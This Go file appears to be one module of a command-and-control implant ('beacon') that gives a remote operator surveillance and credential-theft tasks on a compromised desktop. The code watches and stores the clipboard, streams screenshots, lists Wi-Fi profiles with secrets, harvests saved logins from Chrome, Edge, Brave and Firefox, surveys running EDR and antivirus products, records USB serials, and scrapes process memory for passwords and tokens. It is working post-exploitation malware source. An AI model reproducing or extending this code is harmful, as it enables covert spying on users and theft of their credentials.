package beacon

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// The senses of the desktop.
//
// A workstation has more to give than a shell: a window table, a
// clipboard, a screen that moves, a wireless radio, browsers that keep
// the passwords of the user, security software that watches the machine
// and USB keys that carry the identity of the person.
//
// The tools of the platform are the shortest path to most of it, and the
// implant uses nothing else: it carries no dependency and it needs none.
// Where the platform hides something -- the key of a network that belongs
// to another user, the database of a browser that is locked -- the answer
// says so instead of pretending that the machine has nothing to give.
const (
	// The file the queue of the watchers lives in.
	watchFile = "watch.state"
	// How many items the queue of the watchers keeps.
	maxWatchItems = 400
	// The longest run of printable bytes the scanners accept.
	minSecretString = 6
	// How much of the memory of a process is read at once.
	maxMemoryRegion = 1 << 20
)

// The watcher of the clipboard.
//
// The watcher is a goroutine of the implant, and it writes into a queue
// that lives on the disk: a machine that rebooted in the middle of the
// night still has the message of yesterday.
var (
	clipboardMutex   sync.Mutex
	clipboardRunning bool
	clipboardLast    string
)

// ---------------------------------------------------------------------------
// The window table
// ---------------------------------------------------------------------------

// taskWindowList is the table of the windows of the desktop.
//
// One line per window: the process, the class and the title.  The tools
// of the session know the list, and a headless session has none.
func (b *Beacon) taskWindowList(args map[string]any) Outcome {
	if runtime.GOOS == "windows" {
		return Outcome{Code: 1, Err: "the window table of this implant needs a POSIX desktop"}
	}
	text, err := runSenses("wmctrl -lp 2>/dev/null")
	if err == nil {
		if lines := nonEmptyLines(text); len(lines) > 0 {
			return Outcome{
				Code: 0,
				Out:  sensesReport("window.list", fmt.Sprintf("%d windows (wmctrl)", len(lines)), lines),
				Extra: map[string]any{
					"windows": uint64(len(lines)),
				},
			}
		}
	}
	text, err = runSenses("for id in $(xdotool search --onlyvisible --name '.' 2>/dev/null); do " +
		"echo \"$id|$(xdotool getwindowname $id 2>/dev/null)\"; done")
	if err == nil {
		if lines := nonEmptyLines(text); len(lines) > 0 {
			return Outcome{
				Code: 0,
				Out:  sensesReport("window.list", fmt.Sprintf("%d windows (xdotool)", len(lines)), lines),
				Extra: map[string]any{
					"windows": uint64(len(lines)),
				},
			}
		}
	}
	return Outcome{Code: 1, Err: "the window table is not readable: the machine has neither wmctrl nor xdotool, " +
		"and a headless session has no windows"}
}

// ---------------------------------------------------------------------------
// The clipboard
// ---------------------------------------------------------------------------

// taskClipboardWatch starts, stops and reads the watcher of the clipboard.
func (b *Beacon) taskClipboardWatch(args map[string]any) Outcome {
	switch strOr(args, "action", "status") {
	case "start":
		startClipboardWatch()
		return Outcome{Code: 0, Out: []byte("clipboard.watch: the watcher of the clipboard is running\n")}
	case "stop":
		stopClipboardWatch()
		return Outcome{Code: 0, Out: []byte("clipboard.watch: the watcher of the clipboard was stopped\n")}
	case "poll":
		items := drainWatchQueue()
		if len(items) == 0 {
			return Outcome{Code: 0, Out: []byte("clipboard.watch: the queue is empty\n")}
		}
		return Outcome{
			Code:  0,
			Out:   sensesReport("clipboard.watch", fmt.Sprintf("%d items", len(items)), items),
			Extra: map[string]any{"watch_total": uint64(len(items))},
		}
	default:
		return Outcome{Code: 0, Out: []byte(fmt.Sprintf(
			"clipboard.watch: the watcher is %s\nclipboard.watch: the queue holds %d items\n",
			clipboardStatus(), len(peekWatchQueue())))}
	}
}

// startClipboardWatch starts the watcher of the clipboard.
func startClipboardWatch() {
	clipboardMutex.Lock()
	if clipboardRunning {
		clipboardMutex.Unlock()
		return
	}
	clipboardRunning = true
	clipboardMutex.Unlock()
	go func() {
		for {
			clipboardMutex.Lock()
			running := clipboardRunning
			clipboardMutex.Unlock()
			if !running {
				return
			}
			text, err := readClipboard()
			if err == nil && strings.TrimSpace(text) != "" {
				clipboardMutex.Lock()
				changed := clipboardLast != text
				if changed {
					clipboardLast = text
				}
				clipboardMutex.Unlock()
				if changed {
					pushWatchQueue("clipboard", text)
				}
			}
			time.Sleep(time.Second)
		}
	}()
}

// stopClipboardWatch stops the watcher of the clipboard.
func stopClipboardWatch() {
	clipboardMutex.Lock()
	clipboardRunning = false
	clipboardMutex.Unlock()
}

// clipboardStatus says whether the watcher runs.
func clipboardStatus() string {
	clipboardMutex.Lock()
	defer clipboardMutex.Unlock()
	if clipboardRunning {
		return "running"
	}
	return "stopped"
}

// readClipboard reads the clipboard of the session.
//
// The clipboard belongs to the session of the desktop, so the tools of
// the session read it.  A machine without them has no clipboard the
// implant can reach, and the answer says so.
func readClipboard() (string, error) {
	for _, command := range []string{
		"xclip -o -selection clipboard 2>/dev/null",
		"wl-paste --no-newline 2>/dev/null",
		"xsel --clipboard --output 2>/dev/null",
		"pbpaste 2>/dev/null",
	} {
		text, err := runSenses(command)
		if err == nil && strings.TrimSpace(text) != "" {
			return text, nil
		}
	}
	return "", fmt.Errorf("the clipboard of the session is not readable: no tool of the session answered")
}

// ---------------------------------------------------------------------------
// The queue of the watchers
// ---------------------------------------------------------------------------

// watchPath is where the queue of the watchers lives.
//
// It sits next to the state of the implant, so it follows the user the
// implant runs as and it survives a reboot.
func watchPath() string {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		home = "."
	}
	return filepath.Join(home, ".umbra", watchFile)
}

// pushWatchQueue puts an item into the queue.
func pushWatchQueue(kind, text string) {
	path := watchPath()
	items := readWatchQueue(path)
	items = append(items, fmt.Sprintf("%s|%d|%s", kind, time.Now().UnixMilli(), watchEscape(text)))
	for len(items) > maxWatchItems {
		items = items[1:]
	}
	writeWatchQueue(path, items)
}

// peekWatchQueue reads the queue without emptying it.
func peekWatchQueue() []string {
	return readWatchQueue(watchPath())
}

// drainWatchQueue takes the items of the queue.
//
// The queue is emptied, so the operator does not read the same message
// twice.
func drainWatchQueue() []string {
	path := watchPath()
	items := readWatchQueue(path)
	writeWatchQueue(path, nil)
	return items
}

// readWatchQueue reads the queue from the disk.
//
// The items are kept as they are written: `kind|time|text`, and the text
// is escaped.  The escape and the unescape are the two halves of one
// round trip, and the queue has to survive it.
func readWatchQueue(path string) []string {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	var out []string
	for _, line := range strings.Split(string(data), "\n") {
		if strings.TrimSpace(line) == "" {
			continue
		}
		parts := strings.SplitN(line, "|", 3)
		kind, at, text := "", "", ""
		if len(parts) > 0 {
			kind = parts[0]
		}
		if len(parts) > 1 {
			at = parts[1]
		}
		if len(parts) > 2 {
			text = parts[2]
		}
		out = append(out, fmt.Sprintf("%s %s %s", kind, at, watchUnescape(text)))
	}
	return out
}

// writeWatchQueue writes the queue to the disk.
func writeWatchQueue(path string, items []string) {
	_ = os.MkdirAll(filepath.Dir(path), 0o700)
	_ = os.WriteFile(path, []byte(strings.Join(items, "\n")), 0o600)
}

// watchEscape escapes the separator of the queue.
func watchEscape(text string) string {
	text = strings.ReplaceAll(text, "\\", "\\\\")
	text = strings.ReplaceAll(text, "\n", "\\n")
	text = strings.ReplaceAll(text, "\r", "\\r")
	text = strings.ReplaceAll(text, "|", "\\p")
	return text
}

// watchUnescape unescapes the separator of the queue.
func watchUnescape(text string) string {
	var out strings.Builder
	runes := []rune(text)
	for i := 0; i < len(runes); i++ {
		if runes[i] == '\\' && i+1 < len(runes) {
			switch runes[i+1] {
			case 'n':
				out.WriteRune('\n')
			case 'r':
				out.WriteRune('\r')
			case 'p':
				out.WriteRune('|')
			case '\\':
				out.WriteRune('\\')
			default:
				out.WriteRune('\\')
				out.WriteRune(runes[i+1])
			}
			i++
			continue
		}
		out.WriteRune(runes[i])
	}
	return out.String()
}

// ---------------------------------------------------------------------------
// The screen in motion
// ---------------------------------------------------------------------------

// taskScreenStream is the screen of the machine, a picture at a time.
//
// The frames travel as partial results, so a stream of the screen fits
// through the frames of the protocol.
func (b *Beacon) taskScreenStream(args map[string]any) Outcome {
	count := int(u64Or(args, "frames", 5))
	if count < 1 {
		count = 1
	}
	if count > 30 {
		count = 30
	}
	fps := int(u64Or(args, "fps", 1))
	if fps < 1 {
		fps = 1
	}
	if fps > 30 {
		fps = 30
	}
	var frames [][]byte
	for index := 0; index < count; index++ {
		if index > 0 {
			time.Sleep(time.Second / time.Duration(fps))
		}
		frame, err := captureScreen()
		if err != nil {
			if len(frames) == 0 {
				return Outcome{Code: 1, Err: err.Error()}
			}
			break
		}
		frames = append(frames, frame)
	}
	outcome := Outcome{
		Code:  0,
		Out:   []byte(fmt.Sprintf("screen.stream: %d frames\n", len(frames))),
		Extra: map[string]any{"frames": uint64(len(frames))},
	}
	outcome.Chunks = frames
	return outcome
}

// captureScreen takes one picture of the screen.
//
// The error stream is thrown away before the command runs: a warning of
// the tool in the middle of a picture would corrupt it.
func captureScreen() ([]byte, error) {
	for _, command := range []string{
		"import -window root png:- 2>/dev/null",
		"scrot -z - 2>/dev/null",
		"maim -f png - 2>/dev/null",
	} {
		data, err := runSensesBytes(command)
		if err == nil && len(data) > 128 {
			return data, nil
		}
	}
	return nil, fmt.Errorf("the screen of the machine is not readable: none of import, scrot or maim is installed")
}

// ---------------------------------------------------------------------------
// The wireless networks
// ---------------------------------------------------------------------------

// taskWifiProfiles is the wireless networks of the machine.
//
// The saved networks carry the keys, and the keys belong to the user who
// typed them: the implant runs as that user, so it reads what that user
// may read, and it says so when the key is hidden.
func (b *Beacon) taskWifiProfiles(args map[string]any) Outcome {
	var lines []string
	switch runtime.GOOS {
	case "darwin":
		text, err := runSenses("networksetup -listpreferredwirelessnetworks 2>/dev/null")
		if err != nil {
			return Outcome{Code: 1, Err: "the wireless networks are not readable on this machine"}
		}
		for _, row := range nonEmptyLines(text) {
			if !strings.HasPrefix(row, "Preferred") {
				lines = append(lines, row)
			}
		}
		lines = append(lines, "the keys of the networks are in the keychain of the user")
	default:
		text, err := runSenses("nmcli -t -f SSID,BSSID,SIGNAL,SECURITY device wifi list 2>/dev/null")
		if err != nil {
			lines = append(lines, "the radio did not answer (nmcli)")
		} else {
			lines = append(lines, "the networks around the machine")
			for _, row := range nonEmptyLines(text) {
				lines = append(lines, row)
			}
		}
		text, err = runSenses("nmcli --show-secrets -t -f NAME,TYPE,DEVICE connection show 2>/dev/null")
		if err != nil {
			lines = append(lines, "the saved networks are not readable without the rights of the user")
		} else {
			lines = append(lines, "the saved networks")
			for _, row := range nonEmptyLines(text) {
				lines = append(lines, row)
			}
		}
	}
	return Outcome{
		Code:  0,
		Out:   sensesReport("wifi.profiles", fmt.Sprintf("%d rows", len(lines)), lines),
		Extra: map[string]any{"rows": uint64(len(lines))},
	}
}

// ---------------------------------------------------------------------------
// The browsers
// ---------------------------------------------------------------------------

// The shape of a piece of material.
//
// The secret is only on the wire when the operator asked for it.
type credentialRecord struct {
	Kind       string `json:"kind"`
	Source     string `json:"source"`
	Account    string `json:"account"`
	Target     string `json:"target"`
	Confidence uint64 `json:"confidence"`
	Secret     string `json:"secret"`
	Length     uint64 `json:"length"`
	Redacted   bool   `json:"redacted"`
	Note       string `json:"note"`
}

// taskBrowserCreds is the material of the browsers of the machine.
//
// The report names the accounts and the services, and the material
// itself is only there when the operator asked for it.
func (b *Beacon) taskBrowserCreds(args map[string]any) Outcome {
	raw := boolOr(args, "raw", false)
	var records []credentialRecord
	var notes []string
	for _, browser := range chromiumBrowsers() {
		path := browser.path
		if _, err := os.Stat(path); err != nil {
			continue
		}
		notes = append(notes, fmt.Sprintf("%s: %s", browser.name, path))
		found, err := chromiumLogins(path, browser.name)
		if err != nil {
			notes = append(notes, fmt.Sprintf("%s: %s", browser.name, err.Error()))
			continue
		}
		records = append(records, found...)
	}
	for _, path := range firefoxLogins() {
		notes = append(notes, fmt.Sprintf("firefox: %s", path))
		found, err := firefoxAccounts(path)
		if err != nil {
			notes = append(notes, fmt.Sprintf("firefox: %s", err.Error()))
			continue
		}
		records = append(records, found...)
	}
	if len(records) == 0 && len(notes) == 0 {
		return Outcome{Code: 1, Err: "no browser profile of this user was found: the implant runs as a user that does not use one"}
	}
	values := make([]map[string]any, 0, len(records))
	var lines []string
	for _, record := range records {
		secret := ""
		if raw {
			secret = record.Secret
		}
		values = append(values, map[string]any{
			"kind":       record.Kind,
			"source":     record.Source,
			"account":    record.Account,
			"target":     record.Target,
			"confidence": record.Confidence,
			"secret":     secret,
			"length":     record.Length,
			"redacted":   !raw,
			"note":       record.Note,
		})
		lines = append(lines, fmt.Sprintf("%s | %s | %s | confidence %d | %s",
			record.Kind, record.Target, record.Account, record.Confidence, record.Note))
	}
	for _, note := range notes {
		lines = append(lines, "browser.creds: "+note)
	}
	return Outcome{
		Code: 0,
		Out:  sensesReport("browser.creds", fmt.Sprintf("%d pieces of material in %d profiles", len(records), len(notes)), lines),
		Extra: map[string]any{
			"creds":       values,
			"creds_total": uint64(len(records)),
		},
	}
}

// chromiumBrowser is one of the browsers that keeps its passwords in a
// database of its own.
type chromiumBrowser struct {
	name string
	path string
}

// chromiumBrowsers are the login databases of the Chromium browsers.
func chromiumBrowsers() []chromiumBrowser {
	local := ""
	switch runtime.GOOS {
	case "darwin":
		local = filepath.Join(os.Getenv("HOME"), "Library/Application Support")
	case "windows":
		local = os.Getenv("LOCALAPPDATA")
	default:
		local = filepath.Join(os.Getenv("HOME"), ".config")
	}
	folders := [][2]string{
		{"chrome", "Google/Chrome"},
		{"edge", "Microsoft/Edge"},
		{"brave", "BraveSoftware/Brave-Browser"},
		{"chromium", "chromium"},
	}
	var out []chromiumBrowser
	for _, folder := range folders {
		path := filepath.Join(local, folder[1], "Default", "Login Data")
		if _, err := os.Stat(path); err != nil {
			continue
		}
		out = append(out, chromiumBrowser{name: folder[0], path: path})
	}
	return out
}

// chromiumLogins reads the login database of a Chromium browser.
//
// The database is a SQLite file and the implant carries no SQL, so the
// scan reads the printable runs of the file: the addresses and the
// accounts are stored in the clear, and the passwords are a blob of the
// platform that this implant cannot open.
func chromiumLogins(path, browser string) ([]credentialRecord, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("the database could not be read: %w", err)
	}
	var targets []string
	for _, text := range scanStrings(data) {
		if !strings.HasPrefix(text, "http://") && !strings.HasPrefix(text, "https://") {
			continue
		}
		known := false
		for _, item := range targets {
			if item == text {
				known = true
				break
			}
		}
		if !known {
			targets = append(targets, text)
		}
	}
	if len(targets) == 0 {
		return nil, fmt.Errorf("the database holds no address of this user")
	}
	var out []credentialRecord
	for _, target := range targets {
		out = append(out, credentialRecord{
			Kind:       "password",
			Source:     browser,
			Target:     target,
			Confidence: 70,
			Length:     0,
			Redacted:   true,
			Note:       "the password of the browser is a blob of the platform that this implant cannot open",
		})
	}
	return out, nil
}

// firefoxLogins are the login files of Firefox.
func firefoxLogins() []string {
	base := ""
	switch runtime.GOOS {
	case "darwin":
		base = filepath.Join(os.Getenv("HOME"), "Library/Application Support")
	case "windows":
		base = os.Getenv("APPDATA")
	default:
		base = filepath.Join(os.Getenv("HOME"), ".mozilla")
	}
	profiles := filepath.Join(base, "Firefox", "Profiles")
	entries, err := os.ReadDir(profiles)
	if err != nil {
		return nil
	}
	var out []string
	for _, entry := range entries {
		path := filepath.Join(profiles, entry.Name(), "logins.json")
		if _, err := os.Stat(path); err != nil {
			continue
		}
		out = append(out, path)
	}
	return out
}

// firefoxAccounts reads the login file of Firefox.
//
// The addresses and the accounts are in the clear; the passwords are an
// encrypted blob of NSS, which needs the key database of the profile.
func firefoxAccounts(path string) ([]credentialRecord, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("the file could not be read: %w", err)
	}
	var file struct {
		Encrypted []struct {
			Hostname string `json:"hostname"`
			Username string `json:"encryptedUsername"`
		} `json:"encrypted"`
	}
	if err := json.Unmarshal(data, &file); err != nil {
		return nil, fmt.Errorf("the file is not the login file of firefox")
	}
	var out []credentialRecord
	for _, entry := range file.Encrypted {
		account := entry.Username
		if decoded, err := base64.StdEncoding.DecodeString(entry.Username); err == nil {
			account = string(decoded)
		}
		out = append(out, credentialRecord{
			Kind:       "password",
			Source:     "firefox",
			Target:     entry.Hostname,
			Account:    account,
			Confidence: 60,
			Redacted:   true,
			Note:       "the password of the browser is an encrypted blob of NSS",
		})
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("the file holds no login of this user")
	}
	return out, nil
}

// ---------------------------------------------------------------------------
// The security software
// ---------------------------------------------------------------------------

// taskAVSurvey is the security software of the machine.
//
// The operator wants to know what watches the machine before it does
// anything: the answer is the list of the products, and it is a hint and
// not a proof -- a product that is installed may be turned off.
func (b *Beacon) taskAVSurvey(args map[string]any) Outcome {
	var lines []string
	text, err := runSenses("ps -A -o comm= 2>/dev/null | egrep -i " +
		"'falcon|crowdstrike|sentinel|clamav|osquery|wazuh|carbonblack|bitdefender|kaspersky|eset|sophos|auditd|apparmor' | sort -u")
	if err != nil {
		lines = append(lines, "no security software was found in the process table")
	} else {
		lines = append(lines, "the security software of the machine")
		for _, row := range nonEmptyLines(text) {
			lines = append(lines, row)
		}
	}
	text, err = runSenses("aa-status 2>/dev/null | head -3")
	if err == nil && strings.TrimSpace(text) != "" {
		for _, row := range nonEmptyLines(text) {
			lines = append(lines, row)
		}
	} else {
		lines = append(lines, "the seatbelt of the machine did not answer")
	}
	return Outcome{
		Code:  0,
		Out:   sensesReport("av.survey", fmt.Sprintf("%d rows", len(lines)), lines),
		Extra: map[string]any{"rows": uint64(len(lines))},
	}
}

// ---------------------------------------------------------------------------
// The USB keys
// ---------------------------------------------------------------------------

// taskUSBHistory is the USB devices of the machine, and the ones that
// were there before.
//
// The serial number of a key is on the label of the key, and it is in the
// system for as long as the system remembers.
func (b *Beacon) taskUSBHistory(args map[string]any) Outcome {
	var lines []string
	text, err := runSenses("lsusb 2>/dev/null")
	if err != nil {
		lines = append(lines, "the bus could not be read")
	} else {
		lines = append(lines, "the devices of the bus")
		for _, row := range nonEmptyLines(text) {
			lines = append(lines, row)
		}
	}
	entries, err := os.ReadDir("/sys/bus/usb/devices")
	if err == nil {
		lines = append(lines, "the serial numbers of the devices")
		for _, entry := range entries {
			product := readTrimmed(filepath.Join("/sys/bus/usb/devices", entry.Name(), "product"))
			serial := readTrimmed(filepath.Join("/sys/bus/usb/devices", entry.Name(), "serial"))
			if product == "" && serial == "" {
				continue
			}
			lines = append(lines, fmt.Sprintf("%s | serial %s", product, serial))
		}
	}
	return Outcome{
		Code:  0,
		Out:   sensesReport("usb.history", fmt.Sprintf("%d rows", len(lines)), lines),
		Extra: map[string]any{"rows": uint64(len(lines))},
	}
}

// ---------------------------------------------------------------------------
// The memory of a process
// ---------------------------------------------------------------------------

// taskProcMemory is the memory of a process.
//
// The regions of the process are in /proc, and the regions that are
// readable are read when the implant has the rights of the user.  What
// is found is reported as the strings that carry something that looks
// like a credential.
func (b *Beacon) taskProcMemory(args map[string]any) Outcome {
	pid := strings.TrimSpace(strOr(args, "pid", ""))
	if pid == "" {
		return Outcome{Code: 2, Err: "proc.memory needs args.pid: the process to read"}
	}
	if _, err := strconv.Atoi(pid); err != nil {
		return Outcome{Code: 2, Err: "proc.memory: the pid is not a number"}
	}
	maps, err := os.ReadFile(fmt.Sprintf("/proc/%s/maps", pid))
	if err != nil {
		return Outcome{Code: 1, Err: fmt.Sprintf("the memory of the process %s is not readable: %v", pid, err)}
	}
	regions := nonEmptyLines(string(maps))
	var lines []string
	lines = append(lines, fmt.Sprintf("the process %s has %d regions", pid, len(regions)))
	secrets := 0
	read := 0
	for _, region := range regions {
		if read >= 32 {
			break
		}
		parts := strings.Fields(region)
		if len(parts) < 2 || !strings.HasPrefix(parts[1], "r") {
			continue
		}
		bounds := strings.SplitN(parts[0], "-", 2)
		if len(bounds) != 2 {
			continue
		}
		start, err := strconv.ParseInt(bounds[0], 16, 64)
		if err != nil {
			continue
		}
		end, err := strconv.ParseInt(bounds[1], 16, 64)
		if err != nil {
			continue
		}
		length := end - start
		if length <= 0 || length > maxMemoryRegion {
			continue
		}
		data, err := readProcessMemory(pid, start, int(length))
		if err != nil {
			continue
		}
		read++
		for _, text := range scanStrings(data) {
			if looksSecret(text) {
				secrets++
				lines = append(lines, text)
			}
		}
	}
	lines = append(lines, fmt.Sprintf("%d regions were read, and %d strings look like a secret", read, secrets))
	return Outcome{
		Code:  0,
		Out:   sensesReport("proc.memory", fmt.Sprintf("the process %s", pid), lines),
		Extra: map[string]any{"secrets": uint64(secrets)},
	}
}

// readProcessMemory reads a region of the memory of a process.
//
// The file of the memory is seekable, so the region is read at its own
// place.  A process that belongs to another user refuses the read, and
// the caller says so.
func readProcessMemory(pid string, start int64, length int) ([]byte, error) {
	file, err := os.Open(fmt.Sprintf("/proc/%s/mem", pid))
	if err != nil {
		return nil, err
	}
	defer file.Close()
	buffer := make([]byte, length)
	if _, err := file.ReadAt(buffer, start); err != nil {
		return nil, err
	}
	return buffer, nil
}

// looksSecret says whether the text carries something that looks like a
// credential.
func looksSecret(text string) bool {
	lower := strings.ToLower(text)
	for _, pattern := range []string{
		"password", "passwd", "secret", "token", "api_key", "authorization:", "bearer ", "-----begin",
	} {
		if strings.Contains(lower, pattern) {
			return true
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// The helpers
// ---------------------------------------------------------------------------

// runSenses runs a command of the platform and returns what it printed.
func runSenses(command string) (string, error) {
	out, err := runSensesBytes(command)
	return string(out), err
}

// runSensesBytes runs a command and returns its bytes.
//
// The error stream is thrown away before the command runs: a warning of
// the tool in the middle of a picture would corrupt it.
func runSensesBytes(command string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "/bin/sh", "-c", command)
	out, err := cmd.Output()
	if err != nil {
		return out, err
	}
	return out, nil
}

// nonEmptyLines splits a text into the lines that hold something.
func nonEmptyLines(text string) []string {
	var out []string
	for _, line := range strings.Split(text, "\n") {
		trimmed := strings.TrimSpace(line)
		if trimmed == "" {
			continue
		}
		out = append(out, trimmed)
	}
	return out
}

// scanStrings reads the printable runs of a text: the strings of it.
func scanStrings(data []byte) []string {
	var out []string
	var current strings.Builder
	for _, b := range data {
		if b >= 0x20 && b < 0x7f {
			current.WriteByte(b)
			continue
		}
		if current.Len() >= minSecretString {
			out = append(out, current.String())
		}
		current.Reset()
	}
	if current.Len() >= minSecretString {
		out = append(out, current.String())
	}
	return out
}

// readTrimmed reads a file and returns it without the spaces around it.
func readTrimmed(path string) string {
	data, err := os.ReadFile(path)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(data))
}

// sensesReport builds the report of a family.
func sensesReport(kind, head string, lines []string) []byte {
	var out strings.Builder
	out.WriteString(kind + ": " + head + "\n")
	for _, line := range lines {
		out.WriteString("  " + line + "\n")
	}
	return []byte(out.String())
}
